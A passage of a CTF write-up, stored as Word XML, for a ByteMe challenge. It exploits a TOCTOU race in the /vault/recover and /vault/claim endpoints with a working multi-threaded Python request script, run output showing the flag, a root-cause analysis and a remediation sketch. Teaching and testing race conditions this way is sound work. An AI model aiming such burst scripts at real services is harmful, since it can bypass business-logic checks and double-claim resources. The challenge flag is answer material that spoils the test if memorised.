          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>/vault/claim</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> with either attempt identifier bypasses the sanity check and releases the flag!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Request 1 (Thread A)        Request 2 (Thread B)        Database State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--------------------        --------------------        --------------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SELECT active attempts -&gt; None                          (0 active)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SELECT active attempts -&gt; None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INSERT attempt_1 (reserved)                             (1 reserved)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COMMIT                                                  (1 reserved)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INSERT attempt_2 (reserved) (2 reserved!)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COMMIT                      (2 reserved!)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Worker 1: status -&gt; verified                            (1 verified, 1 reserved)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Worker 2: status -&gt; verified                            (2 verified!)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----------------------------------------------------------------------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Claim(attempt_1) -&gt; verified count == 2 -&gt; SUCCESS! (FLAG RELEASED)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pP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Step 4 — Crafting the Concurrency Exploit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We develop a multi-threaded Python exploit script using Python's </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>concurrent.futures</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> to synchronize requests with millisecond precision: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import requests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import secrets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import time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from concurrent.futures import ThreadPoolExecutor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BASE_URL = "https://byteme-soul-fragment-race.onrender.com"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# For local testing: BASE_URL = "http://127.0.0.1:5000"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def solve():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session = requests.Session()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uname = "solver_" + secrets.token_hex(4)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passwd = "SuperPassword123!"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print(f"[*] Registering user: {uname}")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 = session.post(f"{BASE_URL}/register", data={"username": uname, "password": passwd})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assert r.status_code in [200, 302], "Registration failed"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# Verify session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st = session.get(f"{BASE_URL}/api/status").json()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print(f"[*] Initial fragments: {st['fragments']}/7, Awakened: {st['awakened']}")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def send_recover():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try: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return session.post(f"{BASE_URL}/vault/recover", timeout=5).json()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except Exception as e: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return {"error": str(e)}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print("[*] Launching concurrent burst to /vault/recover...")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with ThreadPoolExecutor(max_workers=16) as pool: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futures = [pool.submit(send_recover) for _ in range(16)]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results = [f.result() for f in futures]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created_attempts = [res["attempt"] for res in results if "attempt" in res]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print(f"[+] Successfully created {len(created_attempts)} overlapping attempts: {created_attempts}")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len(created_attempts) &lt; 2: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print("[-] Race missed; retry needed.")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return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# Wait for the background worker threads to finish verification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print("[*] Waiting 0.5s for worker verification...")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time.sleep(0.5)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# Check status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st = session.get(f"{BASE_URL}/api/status").json()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verified_attempts = [a["id"] for a in st["attempts"] if a["status"] == "verified"]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print(f"[+] Verified attempts count: {len(verified_attempts)}")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len(verified_attempts) &gt;= 2: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target_aid = verified_attempts[0]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print(f"[*] Claiming fragment using attempt {target_aid}...")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claim_res = session.post(f"{BASE_URL}/vault/claim", json={"attempt": target_aid}).json()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print(f"[!] Claim Response: {claim_res}")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if "flag" in claim_res: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print(f"\n[🏆] FLAG: {claim_res['flag']}\n")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return claim_res["flag"]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if __name__ == "__main__":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solve()</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pP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Step 5 — Execution &amp; Flag Extraction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Running the exploit script against the target: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$ python solve_race.py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[*] Registering user: solver_a4f2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[*] Initial fragments: 6/7, Awakened: False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[*] Launching concurrent burst to /vault/recover...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[+] Successfully created 3 overlapping attempts: ['3b8c2d91a0ef', '9f041e8c71d2', 'e17a4b08c9d3']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[*] Waiting 0.5s for worker verification...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[+] Verified attempts count: 3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[*] Claiming fragment using attempt 3b8c2d91a0ef...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[!] Claim Response: {'status': 'awakened', 'flag': 'OWASP{byteme_soul_fragment_race}'}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[🏆] FLAG: OWASP{byteme_soul_fragment_race}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The server accepted the overlapping proofs, updated the user state, and returned the flag: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l_fragment_race_awaken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748B"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Figure 5: Awakened Soul Vault Dashboard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Querying </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>/api/status</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> now confirms that the user holds 7/7 fragments and the vault status is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>awakened</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>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l_fragment_race_api_statu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748B"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Figure 6: API Status Telemetry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Solution Summary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 Parameter | Value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|---|---|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Target Endpoint | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>/vault/recover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/vault/claim</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">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Concurrency Target | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>SELECT ... WHERE status IN ('reserved','verified')</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">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Required State | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>&gt;= 2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> verified attempts simultaneously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 Vulnerability Class | CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition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Flag | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>OWASP{byteme_soul_fragment_race}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> |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Root Cause &amp; Vulnerability Explanation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Non-Atomic State Validation:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> The application separated the validation of existing reservations (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>SELECT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>) from state creation (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>INSERT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">). Without database transactions operating at </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>SERIALIZABLE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> isolation or explicit lock mechanisms (such as Redis locks or atomic DB transactions), parallel threads read stale state simultaneously.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Asynchronous Verification Decoupling:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Spawning independent worker threads without coordinating lifecycle transitions allowed multiple reservations to reach </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>verified</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> status concurrently.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Remediation:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Enforce a database-level unique constraint on active user states, or execute the validation and reservation atomically inside an immediate transaction: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 xml:space="preserve">   # Recommended Fix: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with db_transaction():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# Acquire table/row lock or use unique active token constraint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...</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pP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Tools Used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Python (`requests`, `concurrent.futures`)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Multi-threaded HTTP race harness.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Burp Suite Turbo Intruder</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Alternative GUI testing for request synchronization using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>race()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> handlers.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Timeline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 Step | Action | Result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|---|---|---|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1 | Inspected </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>/vault/claim</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> logic | Discovered </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>verified &lt; 2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> restriction and "contradictory proof" hint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2 | Audited </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>/vault/recover</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Found TOCTOU race gap between reservation lookup and insert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3 | Developed exploit harness | Built Python script with 16 concurrent threads targeting </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>/vault/recover</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">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4 | Executed burst attack | Generated multiple concurrent </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>reserved</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> attempts, promoted to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>verified</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">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5 | Triggered </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>/vault/claim</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Bypassed validation check and recovered </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BE185D"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>OWASP{byteme_soul_fragment_race}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
          <w:color w:val="1F2937"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> |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7"/>
      </w:rPr>
      <w:t xml:space="preserve">ByteMe CTF  •  Author: Pratik Jadhav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ByteMe CTF Writeups  |  Official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